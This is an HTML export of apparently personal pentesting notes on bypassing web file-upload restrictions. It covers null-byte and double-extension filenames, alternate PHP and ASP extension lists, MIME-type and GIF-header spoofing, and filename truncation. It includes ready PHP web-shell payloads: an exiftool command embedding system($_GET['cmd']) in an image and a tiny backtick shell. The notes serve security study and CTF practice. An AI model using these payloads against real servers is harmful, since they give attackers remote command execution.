<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>File Upload</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># File Upload</h1></strong><br />If there&#39;s a file upload function, you might be able to upload a malicious file and execute it.<br />When attacking file upload vulnerabilities, it&#39;s can be helpful to proxy your traffic through Burp so that you can edit values in the upload.<br />Alternatively, you can try using the developer tools in Chrome and Firefox.<br /><br /><strong>Links</strong><br />• <a href="https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf">https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files</a><br /><br /><strong>Tools</strong><br />• <a href="https://github.com/almandin/fuxploider">Fuxploider</a><br /><br /><strong><h2>## File Extension Whitelisting &amp; Blacklisting</h2></strong><br />If a website allows you to upload, more often than not they&#39;re looking for a specific file type and the type of file you can upload will be limited. We want to upload .php files to execute code, not .img files.<br /><br />There are 2 ways in which file extensions are restricted: whitelisting and blacklisting.<br /> <br /><strong>Whitelisting Example</strong><br />The server checks that the file extension is one that&#39;s allowed e.g. jpg, png etc.<br /><div class="codebox"><div class="codebox">if($imageFileType&nbsp;!=&nbsp;&quot;jpg&quot;&nbsp;&amp;&amp;&nbsp;$imageFileType&nbsp;!=&nbsp;&quot;png&quot;&nbsp;&amp;&amp;&nbsp;$imageFileType&nbsp;!=&nbsp;&quot;jpeg&quot;&nbsp;&amp;&amp;&nbsp;$imageFileType&nbsp;!=&nbsp;&quot;gif&quot;)<br />{&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;Sorry,&nbsp;only&nbsp;JPG,&nbsp;JPEG,&nbsp;PNG&nbsp;&amp;&nbsp;GIF&nbsp;files&nbsp;are&nbsp;allowed.&quot;;&nbsp;<br />}</div></div><br /><br /><em><strong>Blacklisting Example</strong></em><br />The server blacklists file extensions it doesn&#39;t want uploading (much weaker than whitelisting)<br /><div class="codebox"><div class="codebox">if($imageFileType&nbsp;==&nbsp;&quot;php&quot;&nbsp;||&nbsp;$imageFileType&nbsp;==&nbsp;&quot;asp&quot;&nbsp;||&nbsp;$imageFileType&nbsp;==&nbsp;&quot;perl&quot;&nbsp;||&nbsp;$imageFileType&nbsp;==&nbsp;&quot;jsp&quot;)<br />{&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;Sorry,&nbsp;$imageFileType&nbsp;is&nbsp;not&nbsp;allowed&nbsp;:(.&quot;;&nbsp;}<br />}</div></div><br /><br /><strong><h3>### Bypass File Extension with Null Byte</h3></strong><br />If you add a NULL byte to the end of the file - <code>00</code> - while uploading the file will be read as its original extension e.g. a .jpg<br /><br />When you access the uploaded file - at <code>http://website.com/file.php%00.jpg</code> - the NULL byte will be terminate the URL early at <code>http://website.com/file.php%00</code> and the file will be accessed as a PHP file. <br /><br /><code>shell.php%00.jpg</code><br /><code>shell.php%00.gif<br />shell.php\x00.gif<br />shell.php%00.png<br />shell.php\x00.png<br />shell.php%00.jpg<br />shell.php\x00.jpg</code><br /><br /><strong><h3>### Double extensions</h3></strong><br /><code>shell.jpg.php</code><br /><code>shell.php.jpg</code><br /><br /><strong><h3>### Encode PHP commands into an image</h3></strong><br /><a href="https://techyzilla.blogspot.com/2012/07/injecting-malicious-php-in-to-an-image-file.html">https://techyzilla.blogspot.com/2012/07/injecting-malicious-php-in-to-an-image-file.html</a><br /><br /><code>exiftool -Comment=&#39;&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[&#39;cmd&#39;]); ?&gt;&#39; lo.jpg</code><br /><code>mv lo.jpg lo.php.jpg</code><br /><br /><strong><h3>### Uppercase/Lowercase</h3></strong><br />Try using uppercase or lowercase or a mix of both for the file extension.<br />The developer&#39;s blacklisting might have missed this.<br /><code>.pHp<br />.PHP<br />.PhP</code><br /><br /><strong><h3>### Try Alternate File Extensions</h3></strong><br /><a href="https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt">https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt</a><br /><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files</a><br /><br /><strong>### PHP</strong><br /><code>.php<br />.php3<br />.php4<br />.php5<br />.php7</code><br /><br />Less known extensions<br /><code>.pht<br />.phar<br />.phpt<br />.pgif<br />.phtml<br />.phtm</code><br /><br />Double extensions<br /><code>.jpeg.php<br />.jpg.php<br />.png.php<br />.php.php<br />.php.rar<br />.php.php.rar<br />.php.html</code><br /><br /><strong>### asp</strong><br /><code>.asp</code><br /><code>.aspx</code><br /><br /><strong>### perl</strong><br /><code>.pl</code><br /><code>.pm</code><br /><code>.cgi</code><br /><code>.lib</code><br /><br /><strong>### jsp</strong><br /><code>.jsp</code><br /><code>.jspx<br />.jsw<br />.jsv<br />.jspf</code><br /><br /><strong>### Adobe ColdFusion</strong><br /><code>.cfm<br />.cfml<br />.cfc<br />.dbm</code><br /><br /><strong><h2>## Mime Type Checking</h2></strong><br />There might be content-type/MIME-type filtering:<br /><div class="codebox"><div class="codebox">if(in_array($mimetype,&nbsp;array(&#39;image/jpeg&#39;,&nbsp;&#39;image/gif&#39;,&nbsp;&#39;image/png&#39;)))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],&nbsp;&#39;/uploads/&#39;.$_FILES[&#39;file&#39;][&#39;name&#39;]);&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;“File&nbsp;uploaded&nbsp;:)”;<br />}&nbsp;else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;Content&nbsp;type&nbsp;doesn’t&nbsp;match&nbsp;:/&quot;;<br />}</div></div><br /><br />To bypass MIM type checking, you can Intercept the file upload in Burp and modify the <code>Content-Type</code> header to a MIME type that is accepted.<br /><br />For example,<br />change <code>Content-Type : application/x-php</code> or <code>Content-Type : application/octet-stream</code> to:<br /><code>Content-Type : image/gif</code><br /><code>Content-Type : image/png</code><br /><code>Content-Type : image/jpeg</code><br /><br />Our PHP file and it scontents will still be uploaded, but the MIME type will describe it as a JPEG (or whatever you choose).<br /><br /><a href=""><img src="images/168-1.png" alt="images/168-1.png" /></a><br /><br /><strong><h2>## Change File Header</h2></strong><br />Some developers might check the header, or the first few lines, of the uploaded file and blacklist the file depending on what&#39;s there.<br /><br />To bypass this you can modify the start of your file.<br />The easiest one to test is the GIF file header - <code>GIF89a;</code><br /><a href=""><img src="images/168-2.png" alt="images/168-2.png" /></a><br /><br /><strong><h2>## Content-Length</h2></strong><br />The developer might check the length of the uploaded content and restrict the file based on its length.<br />This isn&#39;t a popular/common method, but it still happens.<br /><div class="codebox"><div class="codebox">if($_FILES[&quot;fileToUpload&quot;][&quot;size&quot;]&nbsp;&gt;&nbsp;30)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;Sorry,&nbsp;your&nbsp;file&nbsp;is&nbsp;too&nbsp;large.&quot;;<br />}</div></div><br /><br />This is trivial to bypass. You just upload a short payload.<br />You could figure out the maximum size accepted by fuzzing the server, uploading different sized files, and checking what does/doesn&#39;t get uploaded.<br /><br />For a shell less than 30 bytes, use this:<br /><div class="codebox"><div class="codebox">&lt;?=`$_GET[x]`?&gt;</div></div><br /><br /><strong><h2>## Filename Length</h2></strong><br />Try uploading a really long filename.<br />The filename might get truncated and you can insert whatever extension you want at the end of the file.<br />The max filename length in Linux is 255 (bear that in mind if creating/uploading files).<br /><br />Examples:<br />• <em>hackthebox Falafel</em><br /><br /></div>
</body>
</html>
